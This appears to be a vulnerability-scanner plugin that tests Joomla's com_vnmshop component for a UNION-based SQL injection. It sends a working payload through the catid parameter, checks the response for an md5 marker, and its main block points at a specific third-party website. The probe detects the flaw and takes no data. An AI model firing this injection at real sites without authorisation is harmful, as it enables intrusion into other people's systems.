#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:https://cxsecurity.com/issue/WLB-2015090123
import re,time
def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload='index.php?option=com_vnmshop&catid=113%20LIMIT%200,1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,md5(3.14),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&Itemid=211'

    url=arg + payload
    code, head, res, _, _ = curl.curl("%s" % url)
    if code==200 and '4beed3b9c4a886067de0e3a094246f78' in res :
        security_hole('UNION query %s' % url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla','http://inquangcaogiathinh.com/')[1])